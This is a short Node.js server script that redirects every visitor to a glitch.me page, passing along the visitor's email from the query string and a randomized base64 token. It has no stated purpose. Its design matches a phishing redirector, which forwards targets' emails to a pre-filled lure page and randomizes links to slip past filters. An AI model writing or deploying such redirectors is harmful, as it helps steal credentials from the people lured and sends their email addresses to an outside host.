const http = require("http");

const crypto = require("crypto");

// Function to generate random alphanumerics

function generateRandomString(length) {
  return crypto.randomBytes(length).toString("base64").slice(0, length);
}

// Create the server for the first domain

http
  .createServer((req, res) => {
    // Extract the "i" parameter and the user's email (if present)

    const url = new URL(req.url, `http://${req.headers.host}`);

    const iParam = url.searchParams.get("i") || "rand()=="; // Get the 'i' parameter or default

    const userEmail = url.searchParams.get("email") || ""; // Get email from the query string

    // Use the provided 'i' parameter if it exists; otherwise, generate a random string

    const randomStr = iParam !== "rand()==" ? iParam : generateRandomString(45);

    const base64EncodedStr = Buffer.from(randomStr).toString("base64"); // Encode it to Base64

    // Prepare redirect URL with randomized characters and user's email

    const redirectURL = `https://www.amplified-dazzling-slip.glitch.me/?encoded=${encodeURIComponent(
      base64EncodedStr
    )}&email=${encodeURIComponent(userEmail)}`;

    // Set the redirect status and location header

    res.writeHead(302, { Location: redirectURL });

    res.end();
  })
  .listen(8080, () => {
    console.log("Server is running on port 8080 and redirecting...");
  });
